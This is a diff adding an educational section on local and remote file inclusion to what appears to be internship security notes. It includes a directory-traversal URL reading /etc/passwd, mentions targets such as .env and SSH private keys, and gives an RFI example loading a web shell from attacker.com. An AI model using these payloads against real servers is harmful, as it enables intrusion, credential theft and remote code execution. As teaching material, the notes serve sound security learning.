@@ -174,3 +174,59 @@ Example Secure Form:
     <input type="hidden" name="user_token" value="8f3a92b1c4e5d6f7a8b9c0d1e2f3a4b5">
     <input type="submit" value="Change">
     </form>
+
+
+## File Inclusion Attacks:
+
+File inclusion attacks occur when an application allows a user to control which file is loaded or "included" by the server. This typically happens in web applications that use dynamic file inclusion statements (like include, require, or import) without properly validating the input.
+
+* Attackers exploit these vulnerabilities to trick the application into running or displaying files that should be private, leading to data theft or full system takeover.
+
+### 1. Local File Inclusion (LFI)
+
+* Local File Inclusion occurs when an attacker tricks the web application into exposing or executing files that already exist on the local server.
+
+* The goal is usually to read sensitive configuration files or system files that contain passwords, API keys, or user data.
+
+***How it works:***
+
+* Imagine a website that loads pages using a URL parameter: https://example.com/view.php?page=contact.php
+
+* An attacker can use Directory Traversal characters (../) to "exit" the intended folder and access the rest of the file system.
+
+* The Attack: https://example.com/view.php?page=../../../../etc/passwd
+
+* The Result: The server processes the request and displays the contents of the /etc/passwd file (which lists all users on a Linux system) directly in the browser.
+
+![File-inclusion local](https://github.com/pranayvasanth/ApexPlantes-Internship/blob/main/File%20inclusion%20local.png?raw=true)
+
+#### Risks of LFI
+Sensitive Data Leaks: Reading files like config.php, .env, or /root/.ssh/id_rsa.
+
+* Log Poisoning: An advanced attacker might "poison" a log file with malicious code and then use LFI to execute that log file, turning an information leak into a full compromise.
+
+### 2. Remote File Inclusion (RFI)
+
+* Remote File Inclusion is a more critical vulnerability where the attacker tricks the application into loading a file from an external, attacker-controlled server.
+
+* Because the application fetches and executes the code from a URL, the attacker can run any script they want on your server.
+
+***How it works***
+
+* If the server's configuration (like allow_url_include in PHP) is set to "On," an attacker can point the application to their own malicious script.
+
+* The Attack: https://example.com/view.php?page=http://attacker.com/malicious-shell.txt
+
+* The Result: The web server fetches the script from the attacker's site and executes it. This usually grants the attacker a web shell, giving them total control over the server's command line.
+
+![File-inclusion Remote](https://github.com/pranayvasanth/ApexPlantes-Internship/blob/main/Fileinclusion%20remote.png?raw=true)
+
+#### Risks of RFI
+
+* Remote Code Execution (RCE): The attacker can run system commands, delete files, or steal databases.
+
+* Persistent Backdoors: Attackers can upload permanent scripts to maintain access even after the initial vulnerability is patched.
+
+* Malware Distribution: The server can be used to host malware or attack other websites
+
+
